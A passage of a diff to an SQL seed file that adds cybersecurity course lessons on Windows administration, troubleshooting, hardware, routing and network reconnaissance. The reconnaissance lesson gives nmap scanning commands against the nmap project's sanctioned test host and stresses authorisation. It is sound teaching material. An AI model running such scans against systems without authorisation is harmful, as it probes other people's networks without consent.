@@ -20,7 +20,7 @@ INSERT INTO public.courses (id, code, title, description, level, required_tier_l
   ('a0000000-0000-4000-8000-000000000004', 'BH-CYBER-2', 'Core Cyber Foundations', 'Threat landscape, security controls, and operations. Aligned to CompTIA Security+ and ISC² CC.', 2, 2, 90, 4, ARRAY['CompTIA Security+', 'ISC² CC']),
   ('a0000000-0000-4000-8000-000000000005', 'BH-OPS-2', 'Practitioner Core: Cyber Operations', 'SOC operations, incident response, and threat hunting. Aligned to CompTIA CySA+ and ISC² SSCP.', 3, 2, 100, 5, ARRAY['CompTIA CySA+', 'ISC² SSCP']),
   ('a0000000-0000-4000-8000-000000000006', 'BH-SPEC-SOC', 'Specialisation: SOC & Incident Response', 'Advanced SOC, SIEM, and incident handling. Aligned to CompTIA CySA+.', 4, 3, 120, 6, ARRAY['CompTIA CySA+']),
-  ('a0000000-0000-4000-8000-000000000007', 'BH-ADV', 'Advanced & Leadership', 'Security architecture, governance, and leadership. Aligned to CISSP, CISM, and TOGAF.', 5, 3, 150, 7, ARRAY['CISSP', 'CISM', 'TOGAF']);
+  ('a0000000-0000-4000-8000-000000000007', 'BH-ADV', 'Advanced & Leadership', 'Security architecture, governance, and leadership. Aligned to CISSP and CISM.', 5, 3, 150, 7, ARRAY['CISSP', 'CISM']);
 
 -- ========== LEVEL 0: BRIDGE — MODULES ==========
 INSERT INTO public.modules (id, course_id, title, description, order_index) VALUES
@@ -2668,15 +2668,3524 @@ Safe targets for capstones:
 **Never** scan your school, employer, ISP, or any public server without explicit authorisation.
 $md$, 45, 5);
 
--- ========== STANDALONE CAPSTONE MODULES ==========
+-- ========== NEW CURRICULUM EXPANSION MODULES ==========
+INSERT INTO public.modules (id, course_id, title, description, order_index) VALUES
+  -- BH-FOUND-1: new Module 5
+  ('b0000000-0000-4000-8000-000000000015', 'a0000000-0000-4000-8000-000000000002', 'Operating Systems and Troubleshooting', 'Windows and software troubleshooting, operational procedures, and reconnaissance tools.', 5),
+  -- BH-FOUND-2: new Module 4
+  ('b0000000-0000-4000-8000-000000000024', 'a0000000-0000-4000-8000-000000000003', 'Routing, Switching, and Network Operations', 'Routing protocols, switching, IPv6, network troubleshooting, and analysis tools.', 4),
+  -- BH-CYBER-2: new Module 5
+  ('b0000000-0000-4000-8000-000000000035', 'a0000000-0000-4000-8000-000000000004', 'Application Security and Automation', 'Web application attacks, secure coding, scripting, email security, and vulnerability scanning tools.', 5),
+  -- BH-OPS-2: new Modules 3 and 4
+  ('b0000000-0000-4000-8000-000000000043', 'a0000000-0000-4000-8000-000000000005', 'Security Monitoring and Analysis', 'Log analysis, SIEM correlation, network traffic analysis, and Wireshark.', 3),
+  ('b0000000-0000-4000-8000-000000000044', 'a0000000-0000-4000-8000-000000000005', 'Vulnerability and Endpoint Management', 'Vulnerability scanning, EDR, patch management, and access controls for operations.', 4),
+  -- BH-SPEC-SOC: new Modules 3 and 4
+  ('b0000000-0000-4000-8000-000000000053', 'a0000000-0000-4000-8000-000000000006', 'Advanced Detection and Analysis', 'Windows Event Logs, email analysis, EDR workflows, and malware triage.', 3),
+  ('b0000000-0000-4000-8000-000000000054', 'a0000000-0000-4000-8000-000000000006', 'Cloud SOC and Detection Engineering', 'Cloud monitoring, detection engineering, tshark, and Sigma rules.', 4),
+  -- BH-ADV: new Modules 3, 4, 5, 6
+  ('b0000000-0000-4000-8000-000000000063', 'a0000000-0000-4000-8000-000000000007', 'Asset Security and Cryptography', 'Data classification, security models, and cryptographic systems for CISSP.', 3),
+  ('b0000000-0000-4000-8000-000000000064', 'a0000000-0000-4000-8000-000000000007', 'Network Security and Software Security', 'Secure network architecture, protocols, SDLC, and application security.', 4),
+  ('b0000000-0000-4000-8000-000000000065', 'a0000000-0000-4000-8000-000000000007', 'Security Assessment, Operations, and Incident Management', 'Pentesting methodologies, operations management, and incident leadership.', 5),
+  ('b0000000-0000-4000-8000-000000000066', 'a0000000-0000-4000-8000-000000000007', 'Information Security Programme and Governance', 'Programme management, maturity models, COBIT, and ISO 27001.', 6);
+
+-- =====================================================================
+-- ========== CURRICULUM EXPANSION — NEW LESSONS ==========
+-- =====================================================================
+
+-- ========== BH-FOUND-1: Module 5 — Operating Systems and Troubleshooting ==========
+INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
+('b0000000-0000-4000-8000-000000000015', 'Windows OS Management and Command-Line Tools',
+ 'Windows editions, management tools, and command-line fundamentals for CompTIA A+ Core 2.',
+$md$
+# Windows OS Management and Command-Line Tools
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Identify Windows editions (Home, Pro, Enterprise) and their key differences.
+- Use essential Windows management tools: Task Manager, Event Viewer, Device Manager, Disk Management, System Configuration (msconfig), and Resource Monitor.
+- Execute basic commands in Command Prompt and PowerShell.
+- Navigate Windows Settings and Control Panel for common administrative tasks.
+
+## Windows Editions
+
+| Edition | Key Features | Use Case |
+|---------|-------------|----------|
+| **Windows Home** | Basic features, no domain join, no BitLocker, no Group Policy | Home users |
+| **Windows Pro** | Domain join, BitLocker, Group Policy, Remote Desktop host, Hyper-V | Small business, power users |
+| **Windows Enterprise** | All Pro features + DirectAccess, AppLocker, Windows To Go, BranchCache | Large organisations via volume licensing |
+| **Windows Education** | Similar to Enterprise, licensed for schools | Education institutions |
+
+**Exam tip (A+):** Know that BitLocker, Group Policy, and domain join are **not** available in Home edition.
+
+## Essential Management Tools
+
+### Task Manager (Ctrl + Shift + Esc)
+
+Task Manager shows running processes, CPU/memory/disk/network usage, startup programmes, and services. Use it to:
+
+- **End** an unresponsive application (Processes tab → right-click → End task).
+- **Check resource usage** to identify what is consuming CPU or memory.
+- **Disable startup programmes** that slow boot time (Startup tab).
+- **View services** and their status (Services tab).
+
+### Event Viewer (eventvwr.msc)
+
+Event Viewer records system events in logs. The three most important logs are:
+
+| Log | Contents |
+|-----|----------|
+| **Application** | Events from applications (crashes, errors, warnings) |
+| **System** | OS events (driver failures, service start/stop, hardware errors) |
+| **Security** | Logon events, audit successes and failures, policy changes |
+
+Event types: **Information** (normal), **Warning** (potential issue), **Error** (failure occurred), **Critical** (severe failure). Security events also have **Audit Success** and **Audit Failure**.
+
+### Device Manager (devmgmt.msc)
+
+Shows all hardware devices. A yellow triangle with an exclamation mark indicates a driver problem. Use it to update, roll back, or disable drivers. A red X means the device is disabled.
+
+### Disk Management (diskmgmt.msc)
+
+Manage partitions, format drives, assign drive letters, extend or shrink volumes, and initialise new disks. Know the difference between **MBR** (up to 4 primary partitions, 2 TB max) and **GPT** (128 partitions, supports disks > 2 TB, requires UEFI).
+
+### System Configuration (msconfig)
+
+Controls boot options, services, and startup. The **Boot** tab lets you enable Safe Mode. The **Services** tab lets you disable non-Microsoft services for troubleshooting (check "Hide all Microsoft services" first).
+
+### Resource Monitor (resmon)
+
+More detailed than Task Manager. Shows per-process CPU, memory, disk I/O, and network activity. Use it to find which process is reading/writing to disk or using network bandwidth.
+
+## Command Prompt Essentials
+
+| Command | Purpose | Example |
+|---------|---------|---------|
+| `ipconfig` | Show IP configuration | `ipconfig /all` |
+| `ping` | Test connectivity | `ping 8.8.8.8` |
+| `tracert` | Trace route to destination | `tracert google.com` |
+| `nslookup` | Query DNS | `nslookup example.com` |
+| `netstat` | Show active connections | `netstat -an` |
+| `sfc /scannow` | System File Checker — repair corrupted files | Run as admin |
+| `chkdsk` | Check disk for errors | `chkdsk C: /f` |
+| `gpupdate /force` | Refresh Group Policy | Run as admin |
+| `shutdown /r /t 0` | Restart immediately | |
+
+## PowerShell Basics
+
+PowerShell uses **cmdlets** in Verb-Noun format:
+
+| Cmdlet | Purpose |
+|--------|---------|
+| `Get-Process` | List running processes |
+| `Stop-Process -Name notepad` | Kill a process |
+| `Get-Service` | List services |
+| `Get-EventLog -LogName System -Newest 10` | Read last 10 system events |
+| `Test-Connection 8.8.8.8` | PowerShell equivalent of ping |
+| `Get-NetIPAddress` | Show IP configuration |
+
+PowerShell is more powerful than Command Prompt: it supports scripting, piping objects (not just text), and remote management.
+
+## Control Panel vs Settings
+
+Windows has two interfaces for configuration. **Settings** (modern, touch-friendly) is replacing **Control Panel** (legacy, detailed). For the A+ exam, know both:
+
+| Task | Settings Path | Control Panel Path |
+|------|--------------|-------------------|
+| Change display resolution | System → Display | Display |
+| Uninstall a programme | Apps → Apps & features | Programs and Features |
+| Network configuration | Network & Internet | Network and Sharing Center |
+| User accounts | Accounts | User Accounts |
+| Windows Update | Update & Security | Windows Update |
+| Firewall | Update & Security → Windows Security | Windows Defender Firewall |
+
+## Key Takeaways
+
+- Know the differences between Windows editions (Home vs Pro vs Enterprise).
+- Task Manager, Event Viewer, and Device Manager are the three most-tested management tools.
+- Command Prompt and PowerShell are essential for troubleshooting — practise the common commands.
+- Both Control Panel and Settings paths may appear on the exam.
+$md$, 35, 1),
+
+('b0000000-0000-4000-8000-000000000015', 'Software and Application Troubleshooting',
+ 'Diagnose and resolve common software problems including OS boot failures, BSODs, and application crashes.',
+$md$
+# Software and Application Troubleshooting
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Diagnose common Windows boot problems and apply fixes.
+- Identify causes of Blue Screen of Death (BSOD) errors.
+- Troubleshoot application crashes, browser issues, and slow performance.
+- Apply the malware removal process.
+
+## Windows Boot Process
+
+The simplified boot sequence is: **Power On → POST → UEFI/BIOS → Boot Loader (bootmgr) → Windows Kernel → Login Screen**.
+
+If the boot fails at any stage:
+
+| Symptom | Likely Stage | Fix |
+|---------|-------------|-----|
+| No display, no beep | POST failure (hardware) | Check power, reseat RAM, test PSU |
+| Beep codes | POST failure (specific hardware) | Look up beep code for motherboard |
+| "Boot device not found" | Boot loader not found | Check BIOS boot order, repair MBR/BCD |
+| Windows logo then restart loop | Kernel/driver failure | Boot to Safe Mode, use Startup Repair |
+| BSOD during boot | Driver or system file corruption | Safe Mode → roll back driver, `sfc /scannow` |
+
+### Safe Mode
+
+Safe Mode loads Windows with minimal drivers and services. Access it by:
+
+- **Settings → Recovery → Advanced startup → Restart now** (from within Windows).
+- **Hold Shift + click Restart** (from login screen).
+- **Interrupt boot 3 times** — Windows enters Automatic Repair, then Advanced Options → Startup Settings.
+
+Safe Mode variants: **Safe Mode** (no network), **Safe Mode with Networking** (has network), **Safe Mode with Command Prompt**.
+
+### Windows Recovery Environment (WinRE)
+
+WinRE provides: **Startup Repair** (automatic fix), **System Restore** (roll back to restore point), **System Image Recovery** (restore from backup image), **Command Prompt** (manual repair), **Uninstall Updates**.
+
+## Blue Screen of Death (BSOD)
+
+A BSOD means Windows encountered a fatal error and stopped to prevent damage. Key information on the BSOD:
+
+- **Stop code** (e.g. `CRITICAL_PROCESS_DIED`, `IRQL_NOT_LESS_OR_EQUAL`, `PAGE_FAULT_IN_NONPAGED_AREA`).
+- **What failed** — sometimes shows a driver file name (e.g. `nvlddmkm.sys` = NVIDIA driver).
+
+Common causes and fixes:
+
+| Stop Code | Common Cause | Fix |
+|-----------|-------------|-----|
+| `DRIVER_IRQL_NOT_LESS_OR_EQUAL` | Faulty or incompatible driver | Update/roll back driver |
+| `CRITICAL_PROCESS_DIED` | Corrupt system file | `sfc /scannow`, `DISM /Online /Cleanup-Image /RestoreHealth` |
+| `PAGE_FAULT_IN_NONPAGED_AREA` | Bad RAM or driver | Run Windows Memory Diagnostic, update drivers |
+| `KERNEL_SECURITY_CHECK_FAILURE` | Driver incompatibility | Update drivers, check for Windows updates |
+| `INACCESSIBLE_BOOT_DEVICE` | Storage driver issue after update | Boot to recovery, uninstall recent update |
+
+## Application Troubleshooting
+
+| Problem | Checks |
+|---------|--------|
+| Application crashes on launch | Check Event Viewer (Application log), update the app, run as administrator, reinstall |
+| Application runs slowly | Check Task Manager for high CPU/memory usage, close competing processes, check disk space |
+| Application won't install | Check disk space, run as administrator, check compatibility mode, disable antivirus temporarily |
+| Browser crashes or slow | Disable extensions, clear cache, reset browser settings, check for malware |
+| Browser certificate error | Check system date/time (wrong date causes cert errors), clear browser SSL state |
+
+### Slow Computer Diagnosis Checklist
+
+1. **Task Manager** — is CPU, memory, or disk at 100%? Identify the process.
+2. **Startup programmes** — disable unnecessary ones.
+3. **Disk space** — at least 10-15% free on the system drive.
+4. **Malware** — run a full scan.
+5. **Updates** — install pending OS and driver updates.
+6. **Fragmentation** — defragment HDD (do NOT defragment SSD).
+7. **Hardware** — if none of the above helps, consider a failing HDD (check SMART status) or insufficient RAM.
+
+## Malware Removal Process
+
+The CompTIA A+ exam tests this specific order:
+
+1. **Identify and research** the malware symptoms (pop-ups, slow performance, unknown processes, browser redirects, ransom messages).
+2. **Quarantine** the infected system — disconnect from the network to prevent spread.
+3. **Disable System Restore** — malware can hide in restore points.
+4. **Remediate** — boot to Safe Mode, update antivirus definitions, run a full scan. Use a second-opinion scanner (e.g. Malwarebytes). Delete or quarantine detected threats.
+5. **Schedule scans and enable System Restore** — create a new clean restore point.
+6. **Educate the user** — explain what happened and how to avoid it.
+7. **Document** the incident.
+
+## Key Takeaways
+
+- Know the Windows boot sequence and how to enter Safe Mode and WinRE.
+- BSOD stop codes point to the cause — drivers are the most common culprit.
+- Application issues: check Event Viewer, Task Manager, and disk space first.
+- The malware removal process has a specific order the A+ exam expects.
+$md$, 30, 2),
+
+('b0000000-0000-4000-8000-000000000015', 'Operational Procedures, Safety, and Documentation',
+ 'ESD protection, environmental controls, documentation, ticketing, change management, and scripting basics.',
+$md$
+# Operational Procedures, Safety, and Documentation
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Describe safety procedures including ESD, electrical safety, and proper lifting.
+- Explain environmental controls for IT equipment.
+- Document incidents using a ticketing system.
+- Describe change management and its purpose.
+- Identify basic scripting concepts (Bash, PowerShell, batch).
+
+## Safety Procedures
+
+### Electrostatic Discharge (ESD)
+
+Static electricity can destroy sensitive components (RAM, CPUs, expansion cards). Prevention:
+
+- Wear an **anti-static wrist strap** connected to a grounded surface.
+- Work on an **anti-static mat**.
+- Touch a grounded metal object before handling components.
+- Store components in **anti-static bags**.
+- **Never** work on carpet or wear wool clothing when handling components.
+
+### Electrical Safety
+
+- **Never** open a power supply unit (PSU) — capacitors hold lethal charge even when unplugged.
+- Disconnect power before working inside a computer.
+- Use a surge protector or UPS (uninterruptible power supply).
+- Replace damaged power cables immediately.
+
+### Proper Lifting
+
+Servers and UPS units are heavy. Lift with your legs, not your back. Use a cart or get help for equipment over 20 kg.
+
+## Environmental Controls
+
+IT equipment has environmental requirements:
+
+| Factor | Ideal Range | Risk If Exceeded |
+|--------|------------|-----------------|
+| **Temperature** | 18–27°C (64–80°F) | Overheating causes shutdowns and hardware damage |
+| **Humidity** | 40–60% relative | Too low = ESD risk; too high = condensation and corrosion |
+| **Ventilation** | Hot aisle / cold aisle airflow in data centres | Poor airflow leads to hot spots |
+| **Dust** | Minimise with filters and regular cleaning | Dust clogs fans and acts as insulation |
+
+## Documentation and Ticketing
+
+### Ticketing Systems
+
+Most IT teams use a ticketing system (e.g. ServiceNow, Jira Service Management, osTicket). A good ticket includes:
+
+- **Title** — brief description of the issue.
+- **Description** — detailed symptoms, error messages, when it started.
+- **Priority** — Critical, High, Medium, Low.
+- **Category** — Hardware, Software, Network, Account, etc.
+- **Assigned to** — the technician or team.
+- **Status** — Open, In Progress, Resolved, Closed.
+- **Resolution notes** — what was done to fix it.
+
+### Documentation Types
+
+| Document | Purpose |
+|----------|---------|
+| **Knowledge base (KB) article** | Step-by-step fix for a known issue |
+| **Network diagram** | Visual map of network topology |
+| **Asset inventory** | List of all hardware/software with serial numbers, locations, owners |
+| **Standard Operating Procedure (SOP)** | Step-by-step instructions for routine tasks |
+| **Acceptable Use Policy (AUP)** | Rules for using company IT resources |
+
+## Change Management
+
+Change management ensures that changes to IT systems are planned, tested, approved, and documented. The basic process:
+
+1. **Request** — submit a change request describing what, why, and when.
+2. **Review** — a Change Advisory Board (CAB) or change manager reviews the request.
+3. **Approve** — the change is approved, deferred, or rejected.
+4. **Test** — test the change in a non-production environment.
+5. **Implement** — apply the change during an approved maintenance window.
+6. **Document** — record what was done and the outcome.
+7. **Rollback plan** — always have a plan to reverse the change if it fails.
+
+## Scripting Basics
+
+The A+ exam (SY0-701 also tests this) expects you to recognise basic scripting concepts:
+
+| Language | File Extension | Platform | Example |
+|----------|---------------|----------|---------|
+| **Batch** | `.bat` | Windows CMD | `echo Hello` / `for /f %%i in (file.txt) do echo %%i` |
+| **PowerShell** | `.ps1` | Windows | `Get-Service \| Where-Object {$_.Status -eq "Running"}` |
+| **Bash** | `.sh` | Linux/macOS | `for f in *.log; do echo "$f"; done` |
+| **Python** | `.py` | Cross-platform | `import os; print(os.listdir("."))` |
+
+You do not need to write scripts from scratch — you need to **recognise** what a script does and identify the language from its syntax.
+
+## Key Takeaways
+
+- Always use ESD protection when handling internal components.
+- Never open a PSU.
+- Document everything: tickets, changes, and resolutions.
+- Change management = plan, test, approve, implement, document, rollback plan.
+- Recognise basic scripting syntax for Bash, PowerShell, batch, and Python.
+$md$, 25, 3),
+
+('b0000000-0000-4000-8000-000000000015', 'Hardware Deep-Dive: Power, Storage, and Display',
+ 'Power supplies, storage technologies, display types, printers, and BIOS/UEFI for CompTIA A+ Core 1.',
+$md$
+# Hardware Deep-Dive: Power, Storage, and Display
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Describe power supply specifications, connectors, and selection criteria.
+- Compare storage technologies: HDD, SSD (SATA, NVMe, M.2), and RAID levels.
+- Identify display technologies and connector types.
+- Describe printer types and their maintenance.
+- Explain BIOS/UEFI settings and their security relevance.
+
+## Power Supply Units (PSU)
+
+The PSU converts AC power from the wall to DC power for components. Key specifications:
+
+| Specification | Details |
+|--------------|---------|
+| **Wattage** | Total power output (e.g. 500W, 750W). Must exceed total component draw. |
+| **Efficiency rating** | 80 Plus (Bronze, Silver, Gold, Platinum, Titanium). Higher = less wasted as heat. |
+| **Modular vs non-modular** | Modular: detachable cables (cleaner build). Non-modular: all cables fixed. |
+| **Form factor** | ATX (standard desktop), SFX (small form factor). |
+
+Common PSU connectors:
+
+| Connector | Purpose |
+|-----------|---------|
+| 24-pin ATX | Motherboard main power |
+| 4/8-pin EPS | CPU power |
+| 6/8-pin PCIe | Graphics card power |
+| SATA power | Storage drives, optical drives |
+| Molex (4-pin) | Legacy devices, case fans |
+
+## Storage Technologies
+
+| Technology | Interface | Speed | Form Factor | Notes |
+|-----------|-----------|-------|-------------|-------|
+| **HDD** | SATA III | ~150 MB/s | 3.5" (desktop), 2.5" (laptop) | Spinning platters; cheap per GB; fragile |
+| **SSD (SATA)** | SATA III | ~550 MB/s | 2.5" | No moving parts; faster than HDD; limited writes |
+| **SSD (NVMe)** | PCIe (via M.2 slot) | 2,000–7,000 MB/s | M.2 2280 | Fastest; uses PCIe lanes directly |
+| **eMMC** | Embedded | ~400 MB/s | Soldered | Budget laptops and tablets |
+
+### RAID Levels
+
+RAID (Redundant Array of Independent Disks) combines multiple drives:
+
+| RAID | Min Disks | Description | Speed | Redundancy | Usable Capacity |
+|------|-----------|-------------|-------|-----------|----------------|
+| **0** | 2 | Striping — data split across disks | Fast | None — one disk fails, all data lost | 100% |
+| **1** | 2 | Mirroring — identical copy | Normal | One disk can fail | 50% |
+| **5** | 3 | Striping with distributed parity | Fast reads | One disk can fail | (n-1)/n |
+| **10** | 4 | Mirror + Stripe (RAID 1+0) | Fast | One disk per mirror can fail | 50% |
+
+## Display Technologies
+
+| Technology | Description |
+|-----------|-------------|
+| **LCD (LED-backlit)** | Most common; uses liquid crystals with LED backlighting |
+| **OLED** | Each pixel emits own light; perfect blacks; thinner; more expensive |
+| **IPS** | LCD variant with wide viewing angles and accurate colour |
+| **TN** | LCD variant; fast response time but poor viewing angles |
+| **VA** | LCD variant; good contrast ratio; between IPS and TN |
+
+Display connectors: **HDMI** (audio + video, most common), **DisplayPort** (high refresh rate, daisy-chaining), **USB-C/Thunderbolt** (video + data + power), **VGA** (legacy analogue, 15-pin D-sub), **DVI** (legacy digital/analogue).
+
+## Printers
+
+| Type | How It Works | Maintenance |
+|------|-------------|-------------|
+| **Laser** | Toner fused to paper by heat. Process: Processing → Charging → Exposing → Developing → Transferring → Fusing → Cleaning. | Replace toner cartridge, imaging drum, fuser. |
+| **Inkjet** | Liquid ink sprayed onto paper. | Replace ink cartridges, clean print heads, calibrate. |
+| **Thermal** | Heat-sensitive paper (receipts). | Replace paper roll. No ink needed. |
+| **3D (FDM)** | Melts filament layer by layer. | Level build plate, replace filament, clean nozzle. |
+
+## BIOS/UEFI Settings
+
+BIOS (Basic Input/Output System) and UEFI (Unified Extensible Firmware Interface) initialise hardware before the OS loads. Access by pressing a key during POST (Del, F2, F10, or Esc depending on manufacturer).
+
+Key settings:
+
+| Setting | Purpose | Security Relevance |
+|---------|---------|-------------------|
+| **Boot order** | Which device boots first (SSD, USB, Network) | Disable USB boot to prevent unauthorised OS booting |
+| **Secure Boot** | Only allows signed bootloaders | Prevents rootkits and bootkit malware |
+| **TPM** | Trusted Platform Module — stores encryption keys | Required for BitLocker |
+| **Supervisor/admin password** | Protects BIOS settings | Prevents unauthorised changes |
+| **Boot password** | Required to boot the system | Physical access control |
+| **Virtualisation (VT-x/AMD-V)** | Enables hardware virtualisation | Required for Hyper-V, VirtualBox |
+
+## Key Takeaways
+
+- PSU wattage must exceed total system draw; know the connector types.
+- NVMe SSDs are 10–40x faster than HDDs; RAID 5 offers speed + redundancy.
+- Know the laser printing process (Processing through Cleaning) for the A+ exam.
+- Secure Boot and TPM are security-critical BIOS/UEFI settings.
+$md$, 35, 4),
+
+('b0000000-0000-4000-8000-000000000015', 'Reconnaissance Tools: nmap, dig, and whois',
+ 'Hands-on introduction to network reconnaissance tools used in the capstone project.',
+$md$
+# Reconnaissance Tools: nmap, dig, and whois
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Explain what reconnaissance is and why it matters in cybersecurity.
+- Use nmap to discover hosts, open ports, services, and operating systems.
+- Use dig to query DNS records.
+- Use whois to look up domain registration information.
+- Understand the ethical and legal boundaries of scanning.
+
+## What Is Reconnaissance?
+
+Reconnaissance (recon) is the first phase of any security assessment. It involves gathering information about a target to understand its attack surface. There are two types:
+
+- **Passive recon** — gathering information without directly touching the target (WHOIS lookups, DNS queries, OSINT from public sources).
+- **Active recon** — sending packets to the target to discover what is running (port scanning, service detection).
+
+**Legal note:** Never scan systems you do not own or have written permission to test. Unauthorised scanning is illegal in most jurisdictions. In this course we use `scanme.nmap.org`, which is explicitly provided by the nmap project for testing.
+
+## nmap — Network Mapper
+
+nmap is the most widely used network scanning tool. It is pre-installed on Kali Linux.
+
+### Basic Scan
+
+```
+nmap scanme.nmap.org
+```
+
+This performs a TCP SYN scan of the 1,000 most common ports. Output shows which ports are **open**, **closed**, or **filtered** (blocked by a firewall).
+
+### Service Version Detection (-sV)
+
+```
+nmap -sV scanme.nmap.org
+```
+
+This probes open ports to determine what software and version is running (e.g. "Apache httpd 2.4.7" or "OpenSSH 6.6.1p1"). Service versions are critical for identifying known vulnerabilities.
+
+### Default Script Scan (-sC)
+
+```
+nmap -sC scanme.nmap.org
+```
+
+Runs nmap's default NSE (Nmap Scripting Engine) scripts against open ports. These scripts check for common misconfigurations, gather additional information (e.g. SSL certificate details, HTTP titles), and detect well-known vulnerabilities.
+
+### OS Detection (-O)
+
+```
+sudo nmap -O scanme.nmap.org
+```
+
+Attempts to identify the target's operating system by analysing TCP/IP stack behaviour. Requires root/sudo because it uses raw packets.
+
+### Combining Flags
+
+```
+sudo nmap -sV -sC -O scanme.nmap.org
+```
+
+Or use `-A` (aggressive) which combines `-sV`, `-sC`, `-O`, and traceroute:
+
+```
+sudo nmap -A scanme.nmap.org
+```
+
+### Reading nmap Output
+
+```
+PORT     STATE  SERVICE     VERSION
+22/tcp   open   ssh         OpenSSH 6.6.1p1
+80/tcp   open   http        Apache httpd 2.4.7
+9929/tcp open   nping-echo  Nping echo
+```
+
+- **PORT** — port number and protocol.
+- **STATE** — open (accepting connections), closed (reachable but no service), filtered (firewall blocking).
+- **SERVICE** — the protocol nmap thinks is running.
+- **VERSION** — the specific software version.
+
+## dig — DNS Lookup
+
+dig (Domain Information Groper) queries DNS servers for records. It is pre-installed on Kali.
+
+### Common Queries
+
+```
+dig example.com              # A record (IPv4 address)
+dig example.com AAAA         # IPv6 address
+dig example.com MX           # Mail servers
+dig example.com NS           # Name servers
+dig example.com TXT          # TXT records (SPF, DKIM, etc.)
+dig example.com ANY          # All available records
+```
+
+### Reading dig Output
+
+The **ANSWER SECTION** shows the results:
+
+```
+;; ANSWER SECTION:
+example.com.    86400   IN   A   93.184.216.34
+```
+
+This tells you: the domain `example.com` has an A record pointing to IP `93.184.216.34`, with a TTL (time to live) of 86,400 seconds (24 hours).
+
+## whois — Domain Registration Lookup
+
+whois queries the domain registrar for registration details.
+
+```
+whois example.com
+```
+
+Output includes: registrar name, creation date, expiry date, name servers, and sometimes registrant contact information (though many registrations now use privacy protection).
+
+This is useful for:
+
+- Identifying who owns a domain.
+- Finding when a domain was registered (newly registered domains are suspicious).
+- Discovering name servers (may reveal hosting provider).
+
+## Ethical and Legal Boundaries
+
+| Allowed | Not Allowed |
+|---------|-------------|
+| Scanning your own systems | Scanning any system without written permission |
+| Scanning authorised test targets (scanme.nmap.org) | Scanning your employer's network without authorisation |
+| Passive OSINT (whois, DNS, public records) | Using scan results to exploit vulnerabilities without permission |
+
+## Key Takeaways
+
+- nmap is the primary tool for active reconnaissance. Know the flags: `-sV` (versions), `-sC` (scripts), `-O` (OS), `-A` (aggressive).
+- dig queries DNS for A, MX, NS, TXT, and other record types.
+- whois reveals domain ownership and registration details.
+- Always have written permission before scanning.
+$md$, 30, 5);
+
+-- ========== BH-FOUND-2: Module 4 — Routing, Switching, and Network Operations ==========
+INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
+('b0000000-0000-4000-8000-000000000024', 'Routing and Switching Fundamentals',
+ 'VLANs, STP, routing tables, static and dynamic routing protocols for Network+.',
+$md$
+# Routing and Switching Fundamentals
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Explain how switches forward frames using MAC address tables.
+- Describe VLANs, trunking (802.1Q), and their security benefits.
+- Explain how routers forward packets using routing tables.
+- Distinguish static routing from dynamic routing protocols (RIP, OSPF, BGP).
+- Describe Spanning Tree Protocol (STP) and its purpose.
+
+## Switching
+
+A **switch** operates at Layer 2 (Data Link). It learns MAC addresses by examining the source address of incoming frames and records them in its **MAC address table** (also called CAM table). When a frame arrives, the switch looks up the destination MAC:
+
+- **Known unicast** — forward to the specific port.
+- **Unknown unicast** — flood to all ports except the source.
+- **Broadcast** — flood to all ports in the VLAN.
+
+### VLANs (Virtual LANs)
+
+A VLAN logically segments a switch into separate broadcast domains without needing separate physical switches.
+
+| Benefit | Explanation |
+|---------|-------------|
+| **Security** | Isolate sensitive traffic (e.g. finance VLAN separate from guest VLAN) |
+| **Performance** | Reduce broadcast domain size — fewer devices receive broadcasts |
+| **Management** | Group users logically regardless of physical location |
+
+Each VLAN gets a VLAN ID (1–4094). VLAN 1 is the default. Ports are assigned to a VLAN (access port) or carry multiple VLANs (trunk port).
+
+### 802.1Q Trunking
+
+A **trunk** link carries traffic for multiple VLANs between switches (or between a switch and a router). The **802.1Q** standard inserts a 4-byte tag into the Ethernet frame header that identifies the VLAN. The switch at the other end reads the tag and forwards to the correct VLAN.
+
+### Spanning Tree Protocol (STP / 802.1D)
+
+When switches are connected in loops (for redundancy), frames can circulate endlessly — a **broadcast storm**. STP prevents this by:
+
+1. Electing a **root bridge** (switch with the lowest bridge ID).
+2. Calculating the shortest path from every switch to the root.
+3. **Blocking** redundant ports so only one active path exists.
+4. If the active path fails, STP **unblocks** a previously blocked port (convergence).
+
+**RSTP (802.1w)** is a faster version that converges in seconds rather than the 30–50 seconds of original STP.
+
+## Routing
+
+A **router** operates at Layer 3 (Network). It forwards packets between different networks using a **routing table**. Each entry in the routing table contains:
+
+- **Destination network** (e.g. 10.0.1.0/24)
+- **Next hop** (IP of the next router) or **exit interface**
+- **Metric** (cost — lower is preferred)
+
+### Static vs Dynamic Routing
+
+| | Static | Dynamic |
+|-|--------|---------|
+| **Configuration** | Manual — admin enters routes | Automatic — routers exchange routes |
+| **Scalability** | Poor — every route must be added by hand | Good — routers discover new routes automatically |
+| **Use case** | Small networks, default routes, specific overrides | Medium to large networks |
+| **Overhead** | None | Routing protocol traffic uses some bandwidth |
+
+### Dynamic Routing Protocols
+
+| Protocol | Type | Algorithm | Scope | Metric |
+|----------|------|-----------|-------|--------|
+| **RIP** | Distance vector | Bellman-Ford | Small networks | Hop count (max 15) |
+| **OSPF** | Link state | Dijkstra | Enterprise | Cost (based on bandwidth) |
+| **EIGRP** | Hybrid | DUAL | Cisco networks | Composite (bandwidth, delay) |
+| **BGP** | Path vector | Best path | Internet (between ISPs) | AS path, policies |
+
+**Exam tip (Network+):** OSPF is the most commonly tested. Know that it uses areas (Area 0 is the backbone), calculates cost based on bandwidth, and converges faster than RIP. BGP is the protocol that routes traffic between autonomous systems on the internet.
+
+### Default Gateway
+
+The **default gateway** is the router that a device sends packets to when the destination is outside its local network. If your IP is 192.168.1.10/24 and the gateway is 192.168.1.1, any packet destined for an IP outside 192.168.1.0/24 goes to 192.168.1.1.
+
+## Key Takeaways
+
+- Switches use MAC tables; VLANs segment broadcast domains; STP prevents loops.
+- Routers use routing tables; static routing is manual; dynamic routing uses protocols.
+- OSPF (link state, cost-based) and BGP (internet routing) are the most important for Network+.
+- 802.1Q trunking carries multiple VLANs over a single link.
+$md$, 35, 1),
+
+('b0000000-0000-4000-8000-000000000024', 'IPv6 and Network Address Translation',
